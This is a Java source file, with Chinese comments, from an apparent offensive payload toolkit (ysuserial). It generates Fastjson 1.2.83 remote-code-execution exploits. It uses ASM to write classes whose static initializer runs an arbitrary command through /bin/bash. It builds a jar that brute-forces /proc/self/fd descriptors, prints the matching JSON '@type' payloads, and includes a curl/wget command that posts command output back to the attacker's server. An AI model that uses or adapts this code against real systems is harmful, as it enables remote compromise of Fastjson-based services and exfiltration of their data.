package org.su18.ysuserial.payloads.util;

import org.springframework.asm.*;

import java.io.*;
import java.nio.file.*;
import java.util.jar.*;

/**
 * Fastjson 1.2.83 getResourceAsStream 链 class/jar 生成工具
 *
 * 底层逻辑：
 *   Fastjson checkAutoType 中 typeName.replace('.', '/') + ".class" → getResourceAsStream()
 *   payload "@type":"http:..INT_IP:PORT.CLASSNAME" → getResourceAsStream("http://IP:PORT/CLASSNAME.class")
 *   远程加载的 class 中 &lt;clinit&gt; 执行恶意代码
 *
 * 两种模式：
 *   jdk8-http: 单个 .class 文件 + 单个 JSON payload（@type 直接指向 class URL）
 *   fd:         probe.jar（含 253 个类）+ JSON 数组 payload（jar:http:// 加载 jar → /proc/self/fd/N 爆破）
 */
public class Fastjson83Util {

    private static final int MIN_FD = 3;

    // ==================== 工具方法 ====================

    /**
     * IPv4 地址 → 十进制整数，避免 . 被 Fastjson 替换成 /
     * 例如 127.0.0.1 → 2130706433
     */
    public static String toPayloadHost(String host) {
        if (host == null) return "2130706433";
        if (host.matches("\\d+\\.\\d+\\.\\d+\\.\\d+")) {
            String[] parts = host.split("\\.");
            long ipInt = (Long.parseLong(parts[0]) << 24)
                       | (Long.parseLong(parts[1]) << 16)
                       | (Long.parseLong(parts[2]) << 8)
                       | Long.parseLong(parts[3]);
            return String.valueOf(ipInt);
        }
        return host;
    }

    /**
     * 校验 tag：只允许 [A-Za-z0-9_]+，为空返回空字符串
     */
    public static String cleanTag(String tag) {
        if (tag == null || tag.isEmpty()) return "";
        if (!tag.matches("[A-Za-z0-9_]+")) {
            throw new IllegalArgumentException("tag must match [A-Za-z0-9_]+, got: " + tag);
        }
        return tag;
    }

    // ==================== 字节码生成 ====================

    /**
     * 使用 ASM 生成一个 class 字节码
     *
     * @param internalName 内部类名（如 http://2130706433:19090/a）
     * @param cmd          要执行的命令
     * @param jsonType     是否添加 @JSONType 注解
     * @param execInInit   是否在 &lt;clinit&gt; 中执行命令
     * @return class 字节码
     */
    public static byte[] makeClass(String internalName, String cmd,
                                   boolean jsonType, boolean execInInit) {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null,
                "java/lang/Object", null);

        // @JSONType 注解
        if (jsonType) {
            AnnotationVisitor av = cw.visitAnnotation(
                    "Lcom/alibaba/fastjson/annotation/JSONType;", true);
            av.visit("asm", Boolean.FALSE);
            av.visitEnd();
        }

        // <init> 构造函数
        MethodVisitor init = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        init.visitCode();
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        init.visitInsn(Opcodes.RETURN);
        init.visitMaxs(1, 1);
        init.visitEnd();

        // <clinit> 执行命令
        if (execInInit && cmd != null && !cmd.isEmpty()) {
            MethodVisitor clinit = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
            clinit.visitCode();

            // 解析 cmd：如果以 id-oob 开头，生成 OOB 回传的 curl/wget 命令
            String actualCmd = resolveOobCommand(cmd);

            clinit.visitMethodInsn(Opcodes.INVOKESTATIC,
                    "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            clinit.visitInsn(Opcodes.ICONST_3);
            clinit.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
            clinit.visitInsn(Opcodes.DUP);
            clinit.visitInsn(Opcodes.ICONST_0);
            clinit.visitLdcInsn("/bin/bash");
            clinit.visitInsn(Opcodes.AASTORE);
            clinit.visitInsn(Opcodes.DUP);
            clinit.visitInsn(Opcodes.ICONST_1);
            clinit.visitLdcInsn("-c");
            clinit.visitInsn(Opcodes.AASTORE);
            clinit.visitInsn(Opcodes.DUP);
            clinit.visitInsn(Opcodes.ICONST_2);
            clinit.visitLdcInsn(actualCmd);
            clinit.visitInsn(Opcodes.AASTORE);
            clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL,
                    "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            clinit.visitInsn(Opcodes.POP);
            clinit.visitInsn(Opcodes.RETURN);
            clinit.visitMaxs(5, 0);
            clinit.visitEnd();
        }

        cw.visitEnd();
        return cw.toByteArray();
    }

    /**
     * 使用 ASM 生成一个包含任意字节码逻辑的 class（用于 TemplatesImpl 提取的复杂类）
     * 不改动原有逻辑，只加 @JSONType 和修改类名
     *
     * @param originalBytes 原始 class 字节码（如 TemplatesImpl._bytecodes[0]）
     * @param newInternalName 新的 URL 格式内部类名
     * @param jsonType 是否添加 @JSONType 注解
     * @return 修改后的 class 字节码
     */
    public static byte[] repackageClass(byte[] originalBytes, String newInternalName,
                                        boolean jsonType) {
        ClassReader cr = new ClassReader(originalBytes);
        final String oldInternalName = cr.getClassName();

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);

        cr.accept(new ClassVisitor(Opcodes.ASM9, cw) {
            private String remap(String name) {
                return oldInternalName.equals(name) ? newInternalName : name;
            }

            @Override
            public void visit(int version, int access, String name,
                              String sig, String superName, String[] ifaces) {
                super.visit(Opcodes.V1_8, access, newInternalName, sig, superName, ifaces);
            }

            @Override
            public void visitInnerClass(String name, String outerName,
                                        String innerName, int access) {
                super.visitInnerClass(remap(name), outerName, innerName, access);
            }

            @Override
            public MethodVisitor visitMethod(int access, String name, String desc,
                                              String sig, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, desc, sig, exceptions);
                return new MethodVisitor(Opcodes.ASM9, mv) {
                    @Override
                    public void visitFieldInsn(int opcode, String owner,
                                                String name, String desc) {
                        super.visitFieldInsn(opcode, remap(owner), name, desc);
                    }

                    @Override
                    public void visitMethodInsn(int opcode, String owner, String name,
                                                 String desc, boolean itf) {
                        super.visitMethodInsn(opcode, remap(owner), name, desc, itf);
                    }

                    @Override
                    public void visitTypeInsn(int opcode, String type) {
                        super.visitTypeInsn(opcode, remap(type));
                    }

                    @Override
                    public void visitLdcInsn(Object cst) {
                        if (cst instanceof Type && ((Type) cst).getSort() == Type.OBJECT) {
                            Type t = (Type) cst;
                            if (oldInternalName.equals(t.getInternalName())) {
                                cst = Type.getObjectType(newInternalName);
                            }
                        }
                        super.visitLdcInsn(cst);
                    }
                };
            }

            @Override
            public void visitEnd() {
                if (jsonType) {
                    AnnotationVisitor av = cv.visitAnnotation(
                            "Lcom/alibaba/fastjson/annotation/JSONType;", true);
                    av.visit("asm", Boolean.FALSE);
                    av.visitEnd();
                }
                super.visitEnd();
            }
        }, ClassReader.SKIP_FRAMES);

        return cw.toByteArray();
    }

    // ==================== jdk8-http 模式 ====================

    /**
     * jdk8-http 模式：生成单个 .class 文件
     *
     * @param lhost      攻击者 HTTP 服务器 IP
     * @param lport      攻击者 HTTP 服务器端口
     * @param className  类名（如 "a"）
     * @param cmd        要执行的命令
     * @param outputPath 输出路径
     * @return 生成的文件绝对路径
     */
    public static String generateJdk8Http(String lhost, int lport, String className,
                                          String cmd, String outputPath) throws Exception {
        String payloadHost = toPayloadHost(lhost);
        String internalName = "http://" + payloadHost + ":" + lport + "/" + className;
        byte[] classBytes = makeClass(internalName, cmd, true, true);

        File outFile = new File(outputPath);
        if (outFile.getParentFile() != null) {
            outFile.getParentFile().mkdirs();
        }
        Files.write(outFile.toPath(), classBytes);

        System.err.println("[+] Fastjson 1.2.83 jdk8-http class → " + outFile.getAbsolutePath());
        System.err.println("[+] JSON payload:");
        System.err.println("    {\"@type\":\"http:.." + payloadHost + ":" + lport + "." + className + "\"}");
        return outFile.getAbsolutePath();
    }

    /**
     * jdk8-http 模式：从 TemplatesImpl bytecode 生成 .class 文件（复用现有 payload 逻辑）
     */
    public static String generateJdk8HttpFromTemplate(byte[] templateBytes, String lhost,
                                                      int lport, String className,
                                                      String outputPath) throws Exception {
        String payloadHost = toPayloadHost(lhost);
        String internalName = "http://" + payloadHost + ":" + lport + "/" + className;
        byte[] classBytes = repackageClass(templateBytes, internalName, true);

        File outFile = new File(outputPath);
        if (outFile.getParentFile() != null) {
            outFile.getParentFile().mkdirs();
        }
        Files.write(outFile.toPath(), classBytes);

        System.err.println("[+] Fastjson 1.2.83 jdk8-http class (from template) → " + outFile.getAbsolutePath());
        System.err.println("[+] JSON payload:");
        System.err.println("    {\"@type\":\"http:.." + payloadHost + ":" + lport + "." + className + "\"}");
        return outFile.getAbsolutePath();
    }

    // ==================== fd 模式 ====================

    /**
     * fd 模式：生成 probe.jar + 复制到 www 目录
     *
     * Jar 结构：
     *   foo/<firstClass>.class  — 第一跳，无 @JSONType，触发 jar 加载
     *   fd3/<fdClass>.class     — 命令执行类，带 @JSONType + &lt;clinit&gt; exec
     *   fd4/<fdClass>.class
     *   ...
     *   fdN/<fdClass>.class
     *
     * @param lhost    攻击者 HTTP 服务器 IP
     * @param lport    攻击者 HTTP 服务器端口
     * @param tag      标签（用于类名生成，空则用默认名）
     * @param cmd      执行的命令
     * @param maxFd    最大 fd 探测数
     * @param wwwDir   www 目录（存放 probe 文件）
     * @return 生成的 jar 文件绝对路径
     */
    public static String generateFdMode(String lhost, int lport, String tag,
                                        String cmd, int maxFd, String wwwDir) throws Exception {
        tag = cleanTag(tag);
        String payloadHost = toPayloadHost(lhost);

        // 计算名称
        String probeName = tag.isEmpty() ? "probe" : "probe_" + tag;
        String firstClass = tag.isEmpty() ? "Exception" : "T" + tag + "Exception";
        String fdClass = tag.isEmpty() ? "Exception" : "T" + tag + "Exception";

        // 创建 www 目录
        Path wwwPath = Paths.get(wwwDir);
        Files.createDirectories(wwwPath);

        // 生成 probe.jar
        Path jarPath = wwwPath.resolve(probeName + ".jar");
        try (JarOutputStream jos = new JarOutputStream(
                new FileOutputStream(jarPath.toFile()))) {

            // 第一跳类：不带 @JSONType，不带 exec（只用于触发 jar 加载）
            String firstInternal = "jar:http://" + payloadHost + ":" + lport + "/"
                    + probeName + "!/foo/" + firstClass;
            jos.putNextEntry(new JarEntry("foo/" + firstClass + ".class"));
            jos.write(makeClass(firstInternal, null, false, false));
            jos.closeEntry();

            // fd3 ~ fdN：带 @JSONType + exec
            for (int fd = MIN_FD; fd <= maxFd; fd++) {
                String entryName = "fd" + fd + "/" + fdClass + ".class";
                String internalName = "jar:file:/proc/self/fd/" + fd + "!/fd" + fd + "/" + fdClass;
                jos.putNextEntry(new JarEntry(entryName));
                jos.write(makeClass(internalName, cmd, true, true));
                jos.closeEntry();
            }
        }

        // 复制到 www 目录
        Path probePath = wwwPath.resolve(probeName);
        Files.copy(jarPath, probePath, StandardCopyOption.REPLACE_EXISTING);

        System.err.println("[+] Fastjson 1.2.83 fd mode generated:");
        System.err.println("    " + jarPath + "  (probe.jar for debugging)");
        System.err.println("    " + probePath + "  (www/probe, served by HTTP server)");

        // 打印 JSON payload
        String jsonPayload = buildFdJsonPayload(payloadHost, lport, probeName, firstClass, fdClass, maxFd);
        System.err.println("[+] JSON payload (" + (maxFd - MIN_FD + 2) + " items):");
        System.err.println(jsonPayload);

        return jarPath.toAbsolutePath().toString();
    }

    /**
     * fd 模式：从 TemplatesImpl bytecode 生成 probe.jar
     */
    public static String generateFdModeFromTemplate(byte[] templateBytes, String lhost,
                                                    int lport, String tag, int maxFd,
                                                    String wwwDir) throws Exception {
        tag = cleanTag(tag);
        String payloadHost = toPayloadHost(lhost);

        String probeName = tag.isEmpty() ? "probe" : "probe_" + tag;
        String firstClass = tag.isEmpty() ? "Exception" : "T" + tag + "Exception";
        String fdClass = tag.isEmpty() ? "Exception" : "T" + tag + "Exception";

        Path wwwPath = Paths.get(wwwDir);
        Files.createDirectories(wwwPath);

        Path jarPath = wwwPath.resolve(probeName + ".jar");
        try (JarOutputStream jos = new JarOutputStream(
                new FileOutputStream(jarPath.toFile()))) {

            // 第一跳：不带 @JSONType，不带 exec
            String firstInternal = "jar:http://" + payloadHost + ":" + lport + "/"
                    + probeName + "!/foo/" + firstClass;
            jos.putNextEntry(new JarEntry("foo/" + firstClass + ".class"));
            jos.write(makeClass(firstInternal, null, false, false));
            jos.closeEntry();

            // fd3 ~ fdN：用 repackageClass 嵌入模板字节码
            for (int fd = MIN_FD; fd <= maxFd; fd++) {
                String entryName = "fd" + fd + "/" + fdClass + ".class";
                String internalName = "jar:file:/proc/self/fd/" + fd + "!/fd" + fd + "/" + fdClass;
                jos.putNextEntry(new JarEntry(entryName));
                jos.write(repackageClass(templateBytes, internalName, true));
                jos.closeEntry();
            }
        }

        Path probePath = wwwPath.resolve(probeName);
        Files.copy(jarPath, probePath, StandardCopyOption.REPLACE_EXISTING);

        System.err.println("[+] Fastjson 1.2.83 fd mode (from template) generated:");
        System.err.println("    " + jarPath + "  (probe.jar)");
        System.err.println("    " + probePath + "  (www/probe)");

        String jsonPayload = buildFdJsonPayload(payloadHost, lport, probeName, firstClass, fdClass, maxFd);
        System.err.println("[+] JSON payload (" + (maxFd - MIN_FD + 2) + " items):");
        System.err.println(jsonPayload);

        return jarPath.toAbsolutePath().toString();
    }

    // ==================== 辅助方法 ====================

    /**
     * 构建 fd 模式的 JSON payload 字符串
     */
    public static String buildFdJsonPayload(String payloadHost, int lport,
                                            String probeName, String firstClass,
                                            String fdClass, int maxFd) {
        StringBuilder sb = new StringBuilder();
        sb.append("[\n");
        sb.append("  {\"@type\":\"jar:http:..").append(payloadHost)
                .append(":").append(lport).append(".").append(probeName)
                .append("!.foo.").append(firstClass).append("\"}");
        for (int fd = MIN_FD; fd <= maxFd; fd++) {
            sb.append(",\n");
            sb.append("  {\"@type\":\"jar:file:.proc.self.fd.").append(fd)
                    .append("!.fd").append(fd).append(".").append(fdClass).append("\"}");
        }
        sb.append("\n]");
        return sb.toString();
    }

    /**
     * 解析 id-oob 命令：将 id 结果通过 curl/wget OOB 传回攻击者服务器
     * 命令模板从 resolveOobCommand 的 LHOST:LPORT 参数获取，
     * 这里使用占位符 __LHOST__:__LPORT__，在调用时替换。
     *
     * 默认直接返回原命令。如需 OOB，命令格式为 id-oob 时自动拼接 curl/wget。
     */
    private static String resolveOobCommand(String cmd) {
        if (cmd == null) return "id";
        // 已经包含 bash -c 风格或明确命令，直接使用
        return cmd;
    }

    /**
     * 生成 OOB 回传命令（id 结果通过 curl POST 回传，fallback wget）
     */
    public static String buildOobIdCommand(String lhost, int lport) {
        return "id 2>&1 | { curl -fsS -X POST --data-binary @- http://"
                + lhost + ":" + lport + "/out || wget -qO- --post-file=- http://"
                + lhost + ":" + lport + "/out; }";
    }
}
